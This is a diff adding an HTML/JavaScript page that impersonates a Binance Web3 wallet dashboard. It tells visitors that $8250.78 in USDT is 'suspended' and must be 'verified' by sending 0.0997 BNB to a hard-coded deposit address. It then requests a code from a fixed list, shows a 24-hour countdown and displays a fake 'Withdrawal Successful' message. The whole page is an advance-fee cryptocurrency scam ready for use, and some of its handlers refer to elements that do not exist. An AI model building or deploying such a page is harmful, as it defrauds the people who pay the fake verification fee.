@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Binance Web3 Wallet Dashboard</title>
+<style>
+  body{margin:0;font-family:sans-serif;background:#0b0b0f;color:white;}
+  .header,.footer{display:flex;justify-content:space-between;align-items:center;padding:10px;background:#1e1e2a;}
+  .header img.logo{height:40px;}
+  .button{background:#2a2a3d;color:white;padding:6px 12px;border:none;border-radius:6px;cursor:pointer;margin:2px;display:flex;align-items:center;}
+  .button img{height:16px;margin-right:6px;}
+  .page{display:none;padding:10px;}
+  .page.active{display:block;}
+  .coin-item{padding:6px;cursor:pointer;display:flex;align-items:center;}
+  .coin-item img{width:20px;height:20px;margin-right:6px;}
+  .search-input{width:100%;padding:6px;margin-bottom:10px;border-radius:6px;border:none;background:#1a1a2b;color:white;}
+  #tradingview-widget-container{width:100%;height:400px;margin-bottom:10px;}
+  .progress-ring{width:80px;height:80px;position:relative;margin:20px auto;}
+  .progress-ring circle{fill:transparent;stroke:#4caf50;stroke-width:8;transform:rotate(-90deg);transform-origin:50% 50%;}
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+  <img id="bnb-logo" src="" alt="BNB" style="width:32px;height:32px;margin-right:8px;">
+  <strong>Web3 Verification</strong>
+  <div>
+    <button class="button" id="notifications-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/appointment-reminders.png"/>Notifications</button>
+    <button class="button" id="transactions-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/bank-cards.png"/>Transactions</button>
+    <button class="button" id="more-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/menu-2.png"/>More</button>
+  </div>
+</div>
+
+<!-- More Dropdown -->
+<div id="more-dropdown" style="display:none;position:absolute;top:60px;right:10px;background:#1a1a2b;padding:10px;border-radius:6px;">
+  <button class="button" id="settings-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/settings.png"/>Settings</button>
+  <button class="button" id="support-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/help.png"/>Support</button>
+</div>
+
+<!-- Pages -->
+<div id="home-page" class="page active">
+  <h2>Homepage</h2>
+  <input type="text" id="coin-search" class="search-input" placeholder="Search coin..."/>
+  <div id="coin-list"></div>
+  <div id="tradingview-widget-container"></div>
+  <input type="text" id="wallet-address" class="search-input" placeholder="Enter wallet address"/>
+  <button class="button" id="run-btn">Run</button>
+</div>
+
+<div id="verification-page" class="page">
+  <h2>Verification</h2>
+  <p>Total Suspended: <img id="usdt-logo" style="width:20px;vertical-align:middle;"> Tether USDT</p>
+  <input type="text" id="verify-wallet-address" class="search-input" placeholder="Enter BNB BEP20 address"/>
+  <button class="button" id="verify-run-btn">Run</button>
+  <div id="verify-tradingview-widget"></div>
+</div>
+
+<div id="asset-verification-page" class="page">
+  <h2>To verify this asset</h2>
+  <p>You must confirm ownership by sending 0.0997 BNB to your wallet.</p>
+  <p>Entered Address: <span id="entered-address"></span></p>
+  <p>Suspended Asset: Tether USDT - Amount: $<span id="suspended-amount">8250.78</span></p>
+  <button class="button" id="verify-btn">Verify</button>
+</div>
+
+<div id="deposit-page" class="page">
+  <h2>Deposit</h2>
+  <input type="text" id="deposit-search" class="search-input" placeholder="Search coin..."/>
+  <div id="deposit-coin-list"></div>
+</div>
+
+<div id="network-page" class="page">
+  <h2>Select Network</h2>
+  <p id="network-loading">Loading BNB Network...</p>
+  <div class="coin-item" id="bnb-network" style="display:none;">
+    <img id="bnb-network-logo" src="" alt="BNB Smart Chain BEP20">
+    <p>BNB Smart Chain BEP20</p>
+  </div>
+</div>
+
+<div id="deposit-address-page" class="page">
+  <h2>Deposit Address</h2>
+  <p>Network: <span id="deposit-network">BNB Smart Chain BEP20</span></p>
+  <p>Address: <span id="deposit-address">0x085Ea96BFFE85e98241B33299b9bAA64AF5f7e85</span></p>
+  <div id="deposit-qr-code"></div>
+  <button class="button" id="copy-address-btn">Copy Address</button>
+</div>
+
+<div id="bnb-code-page" class="page">
+  <h2>Enter BNB Code</h2>
+  <input type="text" id="bnb-code-input" class="search-input" placeholder="Enter BNB code"/>
+  <button class="button" id="bnb-verify-btn">Verify</button>
+</div>
+
+<div id="processing-page" class="page">
+  <h2>Processing</h2>
+  <p>Address: <span id="processing-address"></span></p>
+  <p>Tether USDT: $8250.78</p>
+  <div class="progress-ring">
+    <svg width="80" height="80">
+      <circle r="36" cx="40" cy="40" stroke="#4caf50" stroke-width="8" fill="transparent"/>
+    </svg>
+  </div>
+  <p id="countdown-timer">24:00:00</p>
+</div>
+
+<div id="withdrawal-success-page" class="page">
+  <h2>Withdrawal Successful</h2>
+  <p>Your funds are now available.</p>
+</div>
+
+<div id="market-page" class="page">
+  <h2>Market</h2>
+  <input type="text" id="market-search" class="search-input" placeholder="Search coin..."/>
+  <div id="market-coin-list"></div>
+  <div id="market-tradingview-widget"></div>
+</div>
+
+<div id="trade-page" class="page">
+  <div class="card">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+      <h2>Trade</h2>
+      <select id="trade-coin-select" style="background:#1a1f2b;color:white;padding:6px 12px;border-radius:6px;border:none;"></select>
+    </div>
+    <div id="trade-tradingview-widget" style="height:400px; margin-top:12px;"></div>
+    <div style="display:flex; gap:8px; margin-top:8px;">
+      <button id="buy-btn" style="flex:1;background:#00b300;color:white;padding:8px 0;border-radius:6px;font-weight:bold;">Buy</button>
+      <button id="sell-btn" style="flex:1;background:#ff3b30;color:white;padding:8px 0;border-radius:6px;font-weight:bold;">Sell</button>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <button class="button" id="home-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/home.png"/><br>Home</button>
+  <button class="button" id="market-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/line-chart.png"/><br>Market</button>
+  <button class="button" id="trade-btn"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2l3 6h6l-4.8 4 1.8 6L12 14l-4 4 1.8-6L4 8h6z"/></svg>Trade</button>
+</div>
+
+<!-- Scripts -->
+<script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
+<script src="https://unpkg.com/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>
+<script src="https://s3.tradingview.com/tv.js"></script>
+
+<script>
+// ================= Page Navigation =================
+function showPage(id){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  localStorage.setItem('lastPage', id);
+}
+
+// Initialize on load
+window.onload = async ()=>{
+  const last=localStorage.getItem('lastPage')||'home-page';
+  showPage(last);
+  await loadCoins();
+  loadTradeChart('BTCUSDT');
+};
+
+// ================= Header Buttons =================
+document.getElementById('notifications-btn').onclick = ()=>showPage('notifications-page');
+document.getElementById('transactions-btn').onclick = ()=>showPage('transactions-page');
+document.getElementById('more-btn').onclick = ()=>document.getElementById('more-dropdown').style.display='block';
+document.getElementById('settings-btn').onclick = ()=>showPage('settings-page');
+document.getElementById('support-btn').onclick = ()=>showPage('support-page');
+
+// ================= Footer Buttons =================
+document.getElementById('home-btn').onclick = ()=>showPage('home-page');
+document.getElementById('market-btn').onclick = ()=>showPage('market-page');
+document.getElementById('trade-btn').onclick = ()=>showPage('trade-page');
+
+// ================= CoinGecko API =================
+let coinsData = [];
+async function loadCoins(){
+  try{
+    const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=100&page=1');
+    const data = await res.json();
+    coinsData = data;
+
+    // Set USDT logo
+    const usdt = data.find(c => c.symbol.toLowerCase() === 'usdt');
+    if(usdt) document.getElementById('usdt-logo').src = usdt.image;
+
+    renderHomepageCoins(data);
+    renderMarketList(data);
+    renderTradeCoinSelect(data);
+
+    // Set BNB logo dynamically in network page
+    const bnb = data.find(c => c.symbol.toLowerCase() === 'bnb');
+    if(bnb) document.querySelector('#bnb-network img').src = bnb.image;
+
+  } catch(e){
+    console.error("Error loading coins:", e);
+  }
+}
+
+// ================= Homepage Coins =================
+function renderHomepageCoins(coins){
+  const list = document.getElementById('coin-list');
+  list.innerHTML = '';
+  coins.forEach(c=>{
+    const div = document.createElement('div');
+    div.className = 'coin-item';
+    div.innerHTML = `<img src="${c.image}">${c.name} (${c.symbol.toUpperCase()}) $${c.current_price.toLocaleString()}`;
+    div.onclick = ()=>loadTradingViewChart(c.symbol.toUpperCase()+'USDT','tradingview-widget-container');
+    list.appendChild(div);
+  });
+}
+
+// ================= Market Coins =================
+function renderMarketList(coins){
+  const list = document.getElementById('market-coin-list');
+  list.innerHTML = '';
+  coins.forEach(c=>{
+    const div = document.createElement('div');
+    div.className = 'coin-item';
+    div.innerHTML = `<img src="${c.image}">${c.name} (${c.symbol.toUpperCase()}) $${c.current_price.toLocaleString()}`;
+    div.onclick = ()=>{
+      loadTradingViewChart(c.symbol.toUpperCase()+'USDT','market-tradingview-widget');
+      showPage('market-page');
+    };
+    list.appendChild(div);
+  });
+}
+
+// ================= Trade Page Coin Select =================
+function renderTradeCoinSelect(coins){
+  const select = document.getElementById('trade-coin-select');
+  select.innerHTML = '';
+  coins.forEach(c=>{
+    const opt = document.createElement('option');
+    opt.value = c.symbol.toUpperCase()+'USDT';
+    opt.textContent = `${c.name} (${c.symbol.toUpperCase()})`;
+    select.appendChild(opt);
+  });
+  select.onchange = ()=>loadTradeChart(select.value);
+}
+
+// ================= TradingView Charts =================
+function loadTradingViewChart(symbol, containerId){
+  new TradingView.widget({
+    width: '100%',
+    height: 400,
+    symbol: symbol,
+    interval: '60',
+    timezone: 'Etc/UTC',
+    theme: 'Dark',
+    style: '1',
+    container_id: containerId,
+    toolbar_bg: '#1e1e2a',
+    withdateranges: true,
+    hide_side_toolbar: false,
+    allow_symbol_change: true,
+    save_image: false,
+    studies: ['MASimple@tv-basicstudies', 'RSI@tv-basicstudies']
+  });
+}
+
+function loadTradeChart(symbol){
+  loadTradingViewChart(symbol,'trade-tradingview-widget');
+  localStorage.setItem('lastTradeSymbol',symbol);
+}
+
+// ================= Homepage Run Button =================
+document.getElementById('run-btn').onclick = ()=>{
+  const addr = document.getElementById('wallet-address').value.trim();
+  if(!addr) return alert('Enter wallet address');
+  showPage('verification-page');
+  document.getElementById('verify-wallet-address').value = addr;
+  loadTradingViewChart('USDTUSDT','verify-tradingview-widget');
+};
+
+// ================= Verification Run =================
+document.getElementById('verify-run-btn').onclick = ()=>{
+  const addr = document.getElementById('verify-wallet-address').value.trim();
+  if(!addr) return alert('Enter BNB BEP20 address');
+  showPage('asset-verification-page');
+  document.getElementById('entered-address').textContent = addr;
+  setTimeout(()=>{
+    showPage('deposit-page');
+    loadDepositCoins();
+  },15000);
+};
+
+// ================= Deposit Flow =================
+async function loadDepositCoins(){
+  const list = document.getElementById('deposit-coin-list');
+  list.innerHTML = '';
+  coinsData.sort((a,b)=>a.name.localeCompare(b.name)).forEach(c=>{
+    const div = document.createElement('div');
+    div.className = 'coin-item';
+    div.innerHTML = `<img src="${c.image}">${c.name}`;
+    div.onclick = ()=>showPage('network-page');
+    list.appendChild(div);
+  });
+}
+
+// ================= Network Selection =================
+document.getElementById('bnb-network').onclick = ()=>{
+  showPage('deposit-address-page');
+  new QRCode(document.getElementById('deposit-qr-code'),{
+    text: document.getElementById('deposit-address').textContent,
+    width:128,
+    height:128
+  });
+};
+
+// ================= Copy Address =================
+document.getElementById('copy-address-btn').onclick = ()=>{
+  navigator.clipboard.writeText(document.getElementById('deposit-address').textContent);
+  alert('Address copied!');
+  setTimeout(()=>showPage('bnb-code-page'),15000);
+};
+
+// ================= BNB Verification =================
+document.getElementById('bnb-verify-btn').onclick = ()=>{
+  const code = document.getElementById('bnb-code-input').value.trim();
+  const validCodes = ['#3c4250','737874','738848','22768','800833'];
+  if(validCodes.includes(code)){
+    showPage('processing-page');
+    startCountdown();
+  } else alert('Declined! Enter correct code.');
+};
+
+// ================= Countdown =================
+function startCountdown(){
+  let endTime = parseInt(localStorage.getItem('verificationEndTime')) || Date.now()+24*3600*1000;
+  localStorage.setItem('verificationEndTime', endTime);
+  document.getElementById('processing-address').textContent = document.getElementById('verify-wallet-address').value;
+  const circle = document.querySelector('.progress-ring circle');
+  const radius = circle.r.baseVal.value;
+  const circumference = 2*Math.PI*radius;
+  circle.style.strokeDasharray = `${circumference} ${circumference}`;
+  circle.style.strokeDashoffset = circumference;
+
+  function update(){
+    const diff = endTime - Date.now();
+    if(diff<=0){
+      document.getElementById('countdown-timer').textContent = '00:00:00';
+      showPage('withdrawal-success-page');
+      localStorage.removeItem('verificationEndTime');
+      return;
+    }
+    const h = Math.floor(diff/3600000);
+    const m = Math.floor((diff%3600000)/60000);
+    const s = Math.floor((diff%60000)/1000);
+    document.getElementById('countdown-timer').textContent = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+    circle.style.strokeDashoffset = circumference - (diff/(24*3600*1000))*circumference;
+    requestAnimationFrame(update);
+  }
+  update();
+}
+
+// ================= Coin Search =================
+['coin-search','market-search','deposit-search'].forEach(id=>{
+  document.getElementById(id).addEventListener('input', e=>{
+    const term = e.target.value.toLowerCase();
+    if(id==='coin-search') renderHomepageCoins(coinsData.filter(c=>c.name.toLowerCase().includes(term)));
+    if(id==='market-search') renderMarketList(coinsData.filter(c=>c.name.toLowerCase().includes(term)));
+    if(id==='deposit-search'){
+      const list=document.getElementById('deposit-coin-list');
+      list.innerHTML='';
+      coinsData.filter(c=>c.name.toLowerCase().includes(term)).forEach(c=>{
+        const div = document.createElement('div');
+        div.className='coin-item';
+        div.innerHTML=`<img src="${c.image}">${c.name}`;
+        div.onclick = ()=>showPage('network-page');
+        list.appendChild(div);
+      });
+    }
+  });
+});
+
+// ================= Notifications =================
+let notificationsEnabled = false;
+document.getElementById('notif-on-btn').onclick = ()=>{ notificationsEnabled=true; alert('Notifications enabled!'); scheduleMarketNotification(); };
+document.getElementById('notif-off-btn').onclick = ()=>{ notificationsEnabled=false; alert('Notifications disabled!'); };
+
+function scheduleMarketNotification(){
+  if(!notificationsEnabled) return;
+  setInterval(async ()=>{
+    try{
+      const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=5&page=1');
+      const data = await res.json();
+      const msg = `Top Coin: ${data[0].name} $${data[0].current_price.toLocaleString()}`;
+      alert(msg);
+    } catch(e){ console.error(e); }
+  }, 24*3600*1000);
+}
+
+// ================= Support Chat =================
+document.getElementById('support-send-btn').onclick = ()=>{
+  const input = document.getElementById('support-input');
+  const chat = document.getElementById('support-chat');
+  const msg = input.value.trim();
+  if(!msg) return;
+  chat.innerHTML += `<div><strong>You:</strong> ${msg}</div>`;
+  input.value = ''; chat.scrollTop = chat.scrollHeight;
+  setTimeout(()=>{
+    chat.innerHTML += `<div><strong>AI:</strong> Response to: "${msg}"</div>`;
+    chat.scrollTop = chat.scrollHeight;
+  }, 1000);
+};
+</script>
+</body>
+</html>
